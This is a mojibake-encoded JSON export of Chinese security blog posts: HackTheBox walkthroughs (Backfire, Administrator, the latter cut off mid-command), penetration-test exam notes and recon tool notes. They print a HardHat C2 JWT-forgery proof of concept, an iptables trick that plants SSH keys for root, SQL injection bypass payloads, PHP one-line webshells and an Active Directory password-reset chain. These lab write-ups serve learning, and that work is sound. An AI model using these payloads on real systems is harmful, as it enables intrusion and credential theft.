[{"title":"Backfire","url":"/2025/01/22/Backfire/","content":"\né¶åœºåœ°å€ï¼šhttps://app.hackthebox.com/machines/643\n\nä¸»æœºï¼šLinux\n\néš¾åº¦ï¼šMedium\n\n# æ€»ä½“æ€è·¯ï¼šHavoc-ssrf RCE->HardHat C2 RCE->iptablesææƒ\n\n## ç«¯å£&ç›®å½•æ‰«æ\n\n```bash\nnmap -sSVC backfire.htb\n\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 10:58 CST\nNmap scan report for backfire.htb\nHost is up (0.47s latency).\nNot shown: 996 closed tcp ports (reset)\nPORT     STATE    SERVICE  VERSION\n22/tcp   open     ssh      OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)\n| ssh-hostkey: \n|   256 7d:6b:ba:b6:25:48:77:ac:3a:a2:ef:ae:f5:1d:98:c4 (ECDSA)\n|_  256 be:f3:27:9e:c6:d6:29:27:7b:98:18:91:4e:97:25:99 (ED25519)\n443/tcp  open     ssl/http nginx 1.22.1\n|_http-server-header: nginx/1.22.1\n| tls-alpn: \n|   http/1.1\n|   http/1.0\n|_  http/0.9\n|_http-title: 404 Not Found\n| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Partners/stateOrProvinceName=Illinois/countryName=US\n| Subject Alternative Name: IP Address:127.0.0.1\n| Not valid before: 2025-01-12T08:46:03\n|_Not valid after:  2028-01-12T08:46:03\n|_ssl-date: TLS randomness does not represent time\n5000/tcp filtered upnp\n8000/tcp open     http     nginx 1.22.1\n|_http-title: Index of /\n| http-ls: Volume /\n| SIZE  TIME               FILENAME                                                                                                         \n| 1559  17-Dec-2024 11:31  disable_tls.patch                                                                                                \n| 875   17-Dec-2024 11:34  havoc.yaotl\n|_\n|_http-open-proxy: Proxy might be redirecting requests\n|_http-server-header: nginx/1.22.1\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 42.20 seconds\n```\n\nçœ‹åˆ°ç›®æ ‡å¼€æ”¾äº†8000ç«¯å£ï¼Œå¹¶ä¸”æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œå°†å…¶ä¸‹è½½ä¸‹æ¥\n\n![image-20250122111153081](Backfire/image-20250122111153081.png)\n\n![image-20250122111211921](Backfire/image-20250122111211921.png)\n\nä¸¢è¿›AIé—®ä¸€é—®æ˜¯ä»€ä¹ˆæ„æ€\n\n![image-20250122111313073](Backfire/image-20250122111313073.png)\n\nOKï¼Œè™½ç„¶ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨ï¼Œä½†æ˜¯æä¾›äº†ç”¨æˆ·åå’Œå¯†ç å¯ä»¥éªŒè¯\n\n## Havoc-ssrf RCE\n\nGitHubä¸Šæœ‰ç°æˆçš„ä¸€é”®åå¼¹shellè„šæœ¬\n\nhttps://github.com/temporaryJustice/Havoc-C2-RCE-2024\n\nä¸‹è½½ä¸‹æ¥åä¿®æ”¹poc.pyä¸­çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œæ‰§è¡Œ\n\n![image-20250123091706134](Backfire/image-20250123091706134.png)\n\næœ¬åœ°èµ·ä¸€ä¸ªshell.shè„šæœ¬ï¼Œæ”¾ç½®ä¸€æ®µåå¼¹shellä»£ç \n\n![image-20250123091728756](Backfire/image-20250123091728756.png)\n\næ­¤å¤„æœ‰å¸ˆå‚…è¯´è¿™ä¸ªshellä¸ç¨³å®šï¼Œå¯ä»¥é€‰æ‹©æœ¬åœ°ç”Ÿæˆä¸€ä¸ªid_rsaï¼Œç„¶åä½¿ç”¨sshç™»é™†ï¼ˆç¬”è€…æ‡’å¾—å¼„äº†ğŸ¤“ï¼‰\n\næŸ¥çœ‹ç«¯å£å¼€æ”¾æƒ…å†µ\n\n![image-20250123092043721](Backfire/image-20250123092043721.png)\n\næœ‰5000å’Œ7096ç«¯å£ï¼Œä¸Šä¼ chiselå°†å…¶ä»£ç†å‡ºæ¥æŸ¥çœ‹\n\nï¼ˆæˆ‘æµ‹ï¼Œä¸€ç›´æ‰shellï¼Œè¿˜æ˜¯å¼„ä¸€ä¸ªsshç™»å½•å§ï¼‰\n\n```bash\nssh-keygen -t rsa -b 2048\n# ç”Ÿæˆå¯†é’¥\n\necho \"ssh-rsa ***** ilya@backfire\" > authorized_keys\n# å°†å…¬é’¥æ–‡ä»¶åŠ å…¥åˆ°è®¤è¯æ–‡ä»¶ä¸­\n\nssh -i id_rsa ilya@backfire.htb\n# ä½¿ç”¨ç§é’¥ç™»å½•\n```\n\n```bash\nkali:chisel server -p 6150 --reverse\n\ntarget:./chisel client 10.10.16.2:6150 R:5000:127.0.0.1:5000 R:7096:127.0.0.1:7096\n```\n\n## HardHat C2 RCE\n\n![image-20250123094254303](Backfire/image-20250123094254303.png)\n\nè¿›å…¥ç•Œé¢æ˜¯HardHat C2ç»„ä»¶ï¼Œå­˜åœ¨RCEæ¼æ´ï¼Œå…·ä½“è¿æ¥å¦‚ä¸‹\n\nhttps://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7\n\nè¿™é‡Œåˆ©ç”¨çš„æ˜¯èº«ä»½ç»•è¿‡æ¼æ´\n\n![image-20250123095317053](Backfire/image-20250123095317053.png)\n\n![image-20250123095332577](Backfire/image-20250123095332577.png)\n\næ–‡ç« ä¸­ä¹Ÿç»™å‡ºäº†pocè¿›è¡Œåˆ©ç”¨\n\n```python\n# @author Siam Thanat Hack Co., Ltd. (STH)\nimport jwt\nimport datetime\nimport uuid\nimport requests\n \nrhost = '127.0.0.1:5000'\n \n# Craft Admin JWT\nsecret = \"jtee43gt-6543-2iur-9422-83r5w27hgzaq\"\nissuer = \"hardhatc2.com\"\nnow = datetime.datetime.utcnow()\n \nexpiration = now + datetime.timedelta(days=28)\npayload = {\n    \"sub\": \"HardHat_Admin\",  \n    \"jti\": str(uuid.uuid4()),\n    \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier\": \"1\",\n    \"iss\": issuer,\n    \"aud\": issuer,\n    \"iat\": int(now.timestamp()),\n    \"exp\": int(expiration.timestamp()),\n    \"http://schemas.microsoft.com/ws/2008/06/identity/claims/role\": \"Administrator\"\n}\n \ntoken = jwt.encode(payload, secret, algorithm=\"HS256\")\nprint(\"Generated JWT:\")\nprint(token)\n \n# Use Admin JWT to create a new user 'sth_pentest' as TeamLead\nburp0_url = f\"https://{rhost}/Login/Register\"\nburp0_headers = {\n  \"Authorization\": f\"Bearer {token}\",\n  \"Content-Type\": \"application/json\"\n}\nburp0_json = {\n  \"password\": \"sth_pentest\",\n  \"role\": \"TeamLead\",\n  \"username\": \"sth_pentest\"\n}\nr = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)\nprint(r.text)\n\næˆ–è€…ä½¿ç”¨ä¸‹è¾¹è¿™ä¸ª\n\nimport jwt\nimport datetime\nimport uuid\nimport requests\n\n# Configuration\nrhost = '127.0.0.1:5000' # Host for the API endpoint\nsecret = \"jtee43gt-6543-2iur-9422-83r5w27hgzaq\" # Secret key for JWT signing\nissuer = \"hardhatc2.com\" # Issuer of the JWT\n\n# Debug: Print configuration settings\nprint(\"[+] Configuration set:\")\nprint(f\" Â  Â rhost: {rhost}\")\nprint(f\" Â  Â secret: {secret[:5]}...\") # Print part of the secret to avoid full exposure\nprint(f\" Â  Â issuer: {issuer}\")\n\n# Create JWT Token for Admin user\nnow = datetime.datetime.utcnow() # Get current UTC time\nexpiration = now + datetime.timedelta(days=28) # Set expiration date for 28 days from now\n\n# Debug: Show time information\nprint(\"[+] Current UTC time:\", now)\nprint(\"[+] Expiration time:\", expiration)\n\n# Define JWT Payload\npayload = {\n    \"sub\": \"HardHat_Admin\", # Subject (the user that the token is for)\n    \"jti\": str(uuid.uuid4()), # Unique identifier for the token\n    \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier\": \"1\", # Name identifier\n    \"iss\": issuer, # Issuer of the token\n    \"aud\": issuer, # Audience for the token\n    \"iat\": int(now.timestamp()), # Issued at time (in seconds since epoch)\n    \"exp\": int(expiration.timestamp()), # Expiration time (in seconds since epoch)\n    \"http://schemas.microsoft.com/ws/2008/06/identity/claims/role\": \"Administrator\" # Role of the user\n}\n\n# Debug: Show payload before encoding\nprint(\"[+] JWT Payload:\")\nfor key, value in payload.items():\n    print(f\" Â  Â {key}: {value}\")\n\n# Encode JWT with the secret and HS256 algorithm\ntoken = jwt.encode(payload, secret, algorithm=\"HS256\")\n\n# Debug: Show generated JWT token (first 50 characters for brevity)\nprint(\"[+] Generated JWT (first 50 chars):\")\nprint(token[:50])\n\n# Use Admin JWT to create a new user 'pfapostol' as TeamLead\nburp0_url = f\"https://{rhost}/Login/Register\" # URL for the user registration endpoint\n\n# Debug: Show the URL for registration\nprint(\"[+] Sending request to URL:\", burp0_url)\n\n# Set headers for the request including the Authorization token\nburp0_headers = {\n    \"Authorization\": f\"Bearer {token}\",\n    \"Content-Type\": \"application/json\"\n}\n\n# JSON data to register the new user\nburp0_json = {\n    \"password\": \"pfapostol\", # Password for the new user\n    \"role\": \"TeamLead\", # Role to be assigned to the new user\n    \"username\": \"pfapostol\" # Username for the new user\n}\n\n# Debug: Show headers and payload for the request\nprint(\"[+] Headers and JSON payload:\")\nprint(\" Â  Â Headers:\", burp0_headers)\nprint(\" Â  Â JSON Payload:\", burp0_json)\n\n# Send the POST request to register the new user\nr = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)\n\n# Debug: Show response status and content\nprint(\"[+] Response status code:\", r.status_code)\nprint(\"[+] Response content:\", r.text)\n```\n\nå°†ä»£ç ä¿®æ”¹åè¿è¡Œ\n\n![image-20250123102412375](Backfire/image-20250123102412375.png)\n\nåˆ›å»ºäº†pfapostolç”¨æˆ·ï¼Œç›´æ¥ç™»å½•\n\n![image-20250123102436065](Backfire/image-20250123102436065.png)\n\nåœ¨å·¦è¾¹æœ‰ä¸€ä¸ªç»ˆç«¯\n\n![image-20250123102601690](Backfire/image-20250123102601690.png)\n\nè¿™é‡Œå¯ä»¥é€‰æ‹©å†æ·»åŠ ä¸€ä¸ªid_rsaè¿›è¡Œç™»å½•ï¼Œä¹Ÿå¯ä»¥ç›´æ¥åå¼¹shell\n\nè¿™é‡Œå°±ç›´æ¥åå¼¹shelläº†\n\n![image-20250123102735349](Backfire/image-20250123102735349.png)\n\næ‹¿åˆ°sergeç”¨æˆ·çš„shell\n\n![image-20250123102815611](Backfire/image-20250123102815611.png)\n\næ‰§è¡Œsudo -lï¼Œå‘ç°å¯ä»¥ä»¥ç®¡ç†å‘˜ç”¨æˆ·è¿è¡Œiptables\n\n![image-20250123102900860](Backfire/image-20250123102900860.png)\n\n## iptablesææƒ\n\nå…·ä½“åˆ©ç”¨é“¾æ¥å¦‚ä¸‹\n\nhttps://cn-sec.com/archives/3193918.html\n\n```bash\nssh-keygen -t ed25519\n# å…ˆç”Ÿæˆä¸€ä¸ªçŸ­sshå¯†é’¥ï¼Œå¤ªé•¿åŠ å…¥ä¸äº†iptablesè§„åˆ™ä¸­\n\nsudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\\nssh-ed25519 ***** sergej@backfire\\n'\nsudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys\n# åˆ©ç”¨iptables-saveå°†åŠ è½½çš„è§„åˆ™çš„å†…å®¹ï¼ˆåŒ…æ‹¬æ³¨é‡Šï¼‰ä¿å­˜è¦†ç›–æ–‡ä»¶ï¼Œè¿™æ ·åœ¨rootç”¨æˆ·ä¸­å°±æœ‰å¯¹sergeç”¨æˆ·id_rsaçš„è®¤è¯ï¼Œå› æ­¤å°±èƒ½å¤Ÿç™»å½•\n\ncat id_ed25519\nssh -i id_ed25519 root@backfire.htb\n# ä½¿ç”¨sergeçš„ç§é’¥ç™»å½•åˆ°rootï¼ˆï¼Ÿï¼‰\n```\n\n![image-20250123105702540](Backfire/image-20250123105702540.png)\n","tags":["HTB"]},{"title":"PTEçŸ¥è¯†ç‚¹","url":"/2024/12/17/PTE/","content":"\nè¿™é‡Œä¸»è¦åˆ†äº«ä¸€äº›åœ¨PTEè¿‡ç¨‹ä¸­é‡åˆ°çš„çŸ¥è¯†ç‚¹\n\n<!--more-->\n\n# SQLæ³¨å…¥\n\nåŸºæœ¬æ ·å¼\n\n```sql\nhttp://127.0.0.1/sql.php?id=1\n```\n\n## ç»•è¿‡å§¿åŠ¿\n\n1.ç»•è¿‡ç©ºæ ¼\n\n```sql\nåŒå†™ç©ºæ ¼ã€tabæ›¿ä»£ç©ºæ ¼\n%0a %20 %09 %0b %0c %0d %a0 /**/\n() ç”¨æ‹¬å·å°†éœ€è¦åˆ†éš”çš„å­—ç¬¦åŒ…è£¹\n```\n\n2.ç»•è¿‡æ³¨é‡Šç¬¦ï¼ˆ#ï¼Œ--ï¼‰\n\n```sql\n%23\næœ«å°¾æ„é€ é—­åˆ\nor '1'='1\nand '1'='1\n```\n\n3.ç»•è¿‡å…³é”®å­—\n\n```sql\næ³¨é‡Šç¬¦ç»•è¿‡\nU/**/NION/**/SE/**/LECT/**/\n\nå¤§å°å†™ç»•è¿‡\nUnIoN/**/SeLeCT\n\nåŒå…³é”®å­—ç»•è¿‡\nUNIunionON/**/SeLselectECT\n```\n\n4.ç»•è¿‡andå’Œor\n\n```sql\nanD anandd\n&& ||\n```\n\n5.ç»•è¿‡=\n\n```sql\nlike\n```\n\n\n\n## è”åˆæ³¨å…¥\n\nå‡å¦‚æ­¤æ—¶æ‰§è¡Œçš„è¯­å¥ä¸º`select * from article where id= ('1')`ï¼Œè·å–æ•°æ®çš„æ–¹å¼å¦‚ä¸‹\n\n```sql\nid=('1') order by 5#\n-- å•å¼•å·é—­åˆåŸå…ˆçš„è¯­å¥ï¼ŒåŠ ä¸Šorder byåˆ¤æ–­åˆ—æ•°ï¼Œ#ç”¨äºå°†åŸå…ˆè¯­å¥ä¸­çš„')æ³¨é‡Šï¼Œä½¿å…¶åé¢çš„å†…å®¹å¤±æ•ˆ\n-- å…¶ä¸­byåé¢çš„æ•°å­—é€ä¸ªå°è¯•ï¼Œç›´è‡³å‡ºç°æŠ¥é”™ä¿¡æ¯ä¸ºæ­¢ï¼Œæœ€ç»ˆä¸ºå‡ºç°æŠ¥é”™ä¿¡æ¯å‰ä¸€ä¸ªæ•°å­—\n-- åˆ¤æ–­åˆ—æ•°æ—¶éœ€è¦ç”¨æ­£ç¡®æ•°æ®\n\nid=('-1') union select 1,2,3,4,5#\n-- ä½¿ç”¨è”åˆæŸ¥è¯¢åˆ¤æ–­å›æ˜¾ç‚¹ï¼Œå…¶ä¸­åé¢1ï¼Œ2ï¼Œ3ä¸ºåˆ¤æ–­å‡ºæ¥çš„åˆ—æ•°\n-- ä½¿ç”¨è”åˆæŸ¥è¯¢æ—¶éœ€è¦ä½¿ç”¨é”™è¯¯æ•°æ®\n\nid=('-1') union select 1,2,database(),4,5#\n-- å‡è®¾3ä¸ºå›æ˜¾ç‚¹ï¼Œå°†å›æ˜¾ç‚¹æ›¿æ¢ä¸ºsqlè¯­å¥å°±èƒ½åœ¨ç•Œé¢ä¸Šå›æ˜¾æ‰§è¡Œsqlè¯­å¥çš„ç»“æœ\n\nid=('-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database(),4,5#\n-- åœ¨å›æ˜¾ç‚¹æ˜¾ç¤ºå½“å‰æ•°æ®åº“æ‰€æœ‰çš„æ•°æ®è¡¨åç§°ï¼Œgroup_concatå‡½æ•°ç”¨äºè¿æ¥æŸ¥è¯¢å‡ºæ¥çš„æ•°æ®è¡¨\n\nid=('-1') union select 1,2,group_concat(0x7e,column_name,0x7e) from information_schema.columns where table_name='tablename',4,5#\n-- æŸ¥è¯¢åç§°ä¸ºtablenameæ•°æ®è¡¨ä¸­çš„åˆ—ï¼Œå¹¶ä»¥~åˆ†å‰²ï¼Œç»“æœç¤ºä¾‹ï¼š~id~,~username~,~password~\n\nid=('-1') union select 1,2,group_concat(id,username,password) from tablename,4,5#\n-- æŸ¥è¯¢tablenameè¡¨ä¸­çš„idï¼Œusernameï¼Œpasswordå­—æ®µå€¼\n\nTips\nid=('-1') union select 1,2,load_file('/tmp/360/key'),4,5#\n-- å¯ä»¥ä½¿ç”¨å‡½æ•°load_file('/etc/passwd')è¯»å–æ–‡ä»¶å†…å®¹\n\nè‹¥ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database(),4,5# ä¸èµ·ä½œç”¨ï¼Œå¯ä»¥å°†fromåçš„å­—ç¬¦ç§»åˆ°æœ«å°¾ï¼Œå¦‚ï¼šunion select 1,2,group_concat(table_name),4,5 from information_schema.tables where table_schema=database()#\n```\n\n\n\n# PHPä¼ªåè®®\n\næ”¯æŒçš„ä¼ªåè®®\n\n```php\nfile:// # è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ\nhttp:// # è®¿é—® HTTP(s) ç½‘å€\nftp:// # è®¿é—® FTP(s) URLs\nphp:// # è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰\nzlib:// # å‹ç¼©æµ\ndata:// # æ•°æ®ï¼ˆRFC 2397ï¼‰\nglob:// # æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼\nphar:// # PHP å½’æ¡£\n```\n\n## php://\n\n### php://filter\n\nphp://filterå¯ä»¥è·å–æŒ‡å®šæ–‡ä»¶æºç ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œphp://filteræµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä¸€èˆ¬å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œè®©å…¶ä¸æ‰§è¡Œï¼Œä»è€Œå¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–\n\n```php\nphp://filter/read=convert.base64-encode/resource=index.php #base64æ–¹å¼è¯»å–\nphp://filter/resource=index.php\n```\n\n#### php://filteråè®®ç»•è¿‡æ­»äº¡exit\n\n```php\n# æ­»äº¡exitï¼šåœ¨å†™å…¥phpä»£ç æ—¶æ‰§è¡Œäº†ä»¥ä¸‹å‡½æ•°\nfile_put_contents($filename, '<?php exit();?>' . $content);\n\n# æ’å…¥ä¸€å¥è¯æœ¨é©¬å\n<?php exit();?>\n<?php @eval($_POST['cmd']);?>\n```\n\nè¿™æ ·æ’å…¥çš„ä¸€å¥è¯æœ¨é©¬å°±ä¸ä¼šè¢«æ‰§è¡Œ\n\nå½“`$content`åŠ ä¸Š`<?php exit();?>`åï¼Œå¯ä»¥ä½¿ç”¨`php://filter/write=convert.base64-decode`å¯¹å…¶ç»•è¿‡\n\nç”±äºbase64ç¼–ç ä¸­ä¸åŒ…å«`,;<>()`ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œå› æ­¤`<?php exit();?>`ä¼šå˜ä¸º`phpexit`ï¼Œä½†æ˜¯base64ç¼–ç ä¸º4byteä¸€ç»„ï¼Œå› æ­¤è¿˜éœ€è¦åŠ ä¸Šä»»æ„ä¸€ä¸ªå­—ç¬¦ç»„åˆï¼Œæœ€ç»ˆpayloadä¸º\n\n```php\n?filename=php://filter/convert.base64-decode/resource=1.php&content=aPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==\n# å†™å…¥çš„æ–‡ä»¶åæ˜¯1.phpï¼Œå†…å®¹ä¸º<?php eval($_POST['cmd']);?>[PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==]\n```\n\n### php://input\n\nphp://inputå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå°†postè¯·æ±‚çš„æ•°æ®å½“ä½œphpä»£ç æ‰§è¡Œã€‚åœ¨enctype=\"multipart/form-data\"çš„æ—¶å€™ï¼Œphp://inputæ˜¯æ— æ•ˆçš„\n\n```php\nhttp://127.0.0.1/include.php?file=php://input\n\nPOSTæ•°æ®\n<?php phpinfo();?>\n# å†™å…¥ä¸€å¥è¯æœ¨é©¬\n<?php fputs(fopen('OneTrojan.php','w'),'<?php @eval($_POST['cmd']); ?>');?>\n```\n\n## data://\n\næ•°æ®æµå°è£…å™¨ï¼Œä¼ é€’ç›¸åº”æ ¼å¼çš„æ•°æ®ã€‚ä¸æ–‡ä»¶åŒ…å«å‡½æ•°ï¼ˆincludeï¼Œrequireï¼Œinclude_onceï¼Œrequire_onceï¼‰ç›¸ç»“åˆæ—¶ç”¨æ¥æ‰§è¡Œphpä»£ç \n\n```php\n#include.php\n<?php\nif (isset($_GET[file])){\n\t$filename  = $_GET['file'];\n\tinclude($filename);\n}else{\n    echo \"file\";\n}\n?>\n```\n\n```php\nhttp://127.0.0.1/include.php?file=data://text/plain,<?php phpinfo();?>\nhttp://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b\n```\n\n## file://\n\nç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶ä¸”ä¸å—allow_url_fopenï¼Œallow_url_includeå½±å“\nä¸»è¦ç”¨äºè®¿é—®æ–‡ä»¶ï¼ˆç»å¯¹è·¯å¾„ã€ç›¸å¯¹è·¯å¾„ä»¥åŠç½‘ç»œè·¯å¾„ï¼‰\n\n```php\nhttp://127.0.0.1?file=file:///etc/passwd\n```\n\n","tags":["Knowledge"]},{"title":"Webç•Œé¢å¸¸è§æ€è·¯","url":"/2024/12/11/Web/","content":"\n# dirsearch\n\nç›®å½•æ‰«æå·¥å…·\n\n```shell\ndirsearch -u http://www.example.com -w /path/to/dic -e* -i 200 -x 400 -r\n```\n\n- `-u` æŒ‡å®šç›®æ ‡URL\n- `-w` æŒ‡å®šå­—å…¸æ–‡ä»¶ï¼Œè·¯å¾„ä¸º/dbï¼Œé»˜è®¤ä½¿ç”¨dicc\n- `-e` æŒ‡å®šè¦æµ‹è¯•çš„æ–‡ä»¶æ‰©å±•åï¼ˆphpï¼Œjsç­‰ï¼‰\n- `-i` æŒ‡å®šä¿ç•™çš„å“åº”ç \n- `-x` æŒ‡å®šæ’é™¤çš„å“åº”ç \n- `-r` é€’å½’æ‰«æå­ç›®å½•\n\n# FFUF\n\nå…¨åŠŸèƒ½æ‰«æå·¥å…·\n\n## ç›®å½•&æ–‡ä»¶æ‰«æ\n\n```bash\nffuf -w directory-list-2.3-medium.txt -u http://example.com/FUZZ -mc 200 -e .php,.txt\n```\n\n- `-w` æŒ‡å®šä¸€ä¸ªåŒ…å«æ½œåœ¨ç›®å½•/æ–‡ä»¶åçš„å­—å…¸æ–‡ä»¶\n- `-u` æŒ‡å®šç›®æ ‡URL\n- `-mc 200` æŒ‡å®šåªæ˜¾ç¤ºçŠ¶æ€ç ä¸º200çš„å“åº”\n- `-e` æŒ‡å®šæ‰©å±•å\n\n## å­åŸŸåçˆ†ç ´\n\n```bash\nffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://example.htb -H \"Host: FUZZ.example.htb\" -mc 200 -c\n```\n\n- `-w` æŒ‡å®šä¸€ä¸ªåŒ…å«æ½œåœ¨å­åŸŸåçš„å­—å…¸æ–‡ä»¶\n- `-u` æŒ‡å®šç›®æ ‡URL\n- `-H` æ·»åŠ HTTPå¤´ä¿¡æ¯\n- `-mc 200` æŒ‡å®šåªæ˜¾ç¤ºçŠ¶æ€ç ä¸º200çš„å“åº”\n- `-c` æ˜¾ç¤ºé¢œè‰²\n\n## æš´åŠ›ç ´è§£\n\n```bash\nffuf -u 'http://www.example/login.php' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=jose&password=FUZZ' -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -mc all -fs 62 -t 100\n```\n\n- `-w` æŒ‡å®šä¸€ä¸ªåŒ…å«æ½œåœ¨å¯†ç çš„å­—å…¸æ–‡ä»¶\n- `-X POST` æŒ‡å®šHTTPæ–¹æ³•ä¸ºPOST\n- `-d` æŒ‡å®šPOSTæ•°æ®\n- `-u` æŒ‡å®šç›®æ ‡URL\n- `-t` æŒ‡å®šå¹¶å‘çº¿ç¨‹ä¸ªæ•°\n\n## åŒ¹é…å™¨é€‰é¡¹\n\n- `-mc` åŒ¹é…HTTPçŠ¶æ€ä»£ç ï¼ˆ200,204,301,302,307,403,404,500ï¼‰\n- `-ml` åŒ¹é…å“åº”è¡Œæ•°\n- `-mr` åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼\n- `-ms` åŒ¹é…HTTPå“åº”å¤§å°\n- `-mw` åŒ¹é…å“åº”çš„å•è¯æ•°é‡\n\n## è¿‡æ»¤å™¨é€‰é¡¹\n\n- `-fc` ä»å“åº”ä¸­ç­›é€‰HTTPçŠ¶æ€ä»£ç \n- `-fl` æ ¹æ®å“åº”çš„è¡Œæ•°è¿›è¡Œè¿‡æ»¤\n- `-fs` ç­›é€‰å™¨HTTPå“åº”å¤§å°\n\n# URLFinder\n\nçˆ¬å–jsæ–‡ä»¶å·¥å…·\n\n```cmd\nURLFinder.exe -s all -m 2 -u http://www.example.com\n```\n\n# Spring-boot Scan\n\næ‰«æspring-bootç»„ä»¶æ³„éœ²æ¼æ´\n\nå¯ä»¥å°†æ‰€æœ‰æ¥å£ç»Ÿä¸€åˆ°dirsearchä¸­è¿›è¡Œæ‰«æ\n\n```python\npython3 SpringBoot-Scan.py -u example.com\n```\n","tags":["Knowledge"]},{"title":"Administrator","url":"/2024/12/10/Administrator/","content":"\né¶åœºåœ°å€ï¼šhttps://app.hackthebox.com/machines/Administrator\n\nä¸»æœºï¼šWindows\n\néš¾åº¦ï¼šMedium\n\n# æ€»ä½“æ€è·¯ï¼šç«¯å£æ‰«æ->Bloodhound->ForceChangePassword->pwsafeç ´è§£->DCSync\n\n## ç«¯å£æ‰«æ\n\n```bash\nnmap -sSVC 10.10.11.42\n\nStarting Nmap 7.94SVN ( https://nmap.org )\nNmap scan report for administrator.htb (10.10.11.42)\nHost is up (1.8s latency).\nNot shown: 988 closed tcp ports (reset)\nPORT     STATE SERVICE       VERSION\n21/tcp   open  ftp           Microsoft ftpd\n| ftp-syst: \n|_  SYST: Windows_NT\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos \n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n```\n\nå¾ˆç†Ÿæ‚‰çš„å‡ ä»¶å¥—ï¼Œå¹¶ä¸”ç»™äº†ç”¨æˆ·åå’Œå¯†ç ï¼šOlivia/ichliebedich\n\n## Bloodhound\n\nä¸Šä¸€ä¸ªbloodhoundæå–åŸŸå†…ä¿¡æ¯\n\n```bash\nbloodhound-python -c all -u olivia -p 'ichliebedich' -d administrator.htb -ns 10.10.11.42 --zip\n```\n\næ‰§è¡Œå®Œæ¯•åï¼Œä¼šç”Ÿæˆä¸€ä¸ªzipæ–‡ä»¶ï¼Œå°†å…¶å¯¼å…¥è¿›bloodhoundåˆ†æ\n\n```bash\n# å¯åŠ¨bloodhound\nneo4j start\nbloodhound --no-sandbox\n```\n\n![image-20241210154020686](Administrator/image-20241210154020686.png)\n\nå¯ä»¥çœ‹åˆ°ç›®å‰çš„åˆ©ç”¨è·¯å¾„ä¸ºolivia->michael->benjaminï¼Œè€Œæœ€ç»ˆè·¯å¾„ä¸ºemily->ethan->administrator.htb\n\nä¸€æ­¥æ­¥æ¥å§é‚£ä¹ˆ\n\n### olivia->michael\n\nè¦å®ç°è¿™ä¸€æ­¥ï¼Œéœ€è¦åˆ©ç”¨åˆ°GenericAllæƒé™\n\nå‚è€ƒé“¾æ¥ï¼šhttps://offensive.run/winecosystem/4acl/README.html#genericall-user\n\n![image-20241210155400943](Administrator/image-20241210155400943.png)\n\næŒ‰ç…§ä»–çš„æ¥ï¼Œä¿®æ”¹michaelç”¨æˆ·çš„å¯†ç ä¸ºmichael\n\n```bash\nbloodyAD --host 'dc.administrator.htb' -d 'administrator.htb' -u 'olivia' -p 'ichliebedich' set password michael michael\n```\n\næŸ¥çœ‹æ˜¯å¦ä¿®æ”¹æˆåŠŸï¼Œå°è¯•ç”¨evil-winrmç™»å½•\n\n![image-20241210160226484](Administrator/image-20241210160226484.png)\n\nç»§ç»­ä¸‹ä¸€æ­¥\n\n## ForceChangePassword\n\n### michael->benjamin\n\nmichaelå¯¹benjaminç”¨æˆ·å…·æœ‰ForceChangePasswordæƒé™\n\nå‚è€ƒé“¾æ¥ï¼šhttps://book.hacktricks.xyz/cn/windows-hardening/active-directory-methodology/acl-persistence-abuse#forcechangepassword\n\n![image-20241210161108022](Administrator/image-20241210161108022.png)\n\nä½¿ç”¨rpcclientå¼ºåˆ¶ä¿®æ”¹å¯†ç \n\n```bash\nrpcclient -U michael 10.10.11.42\nPassword for [WORKGROUP\\michael]:\nrpcclient $> setuserinfo2 benjamin 23 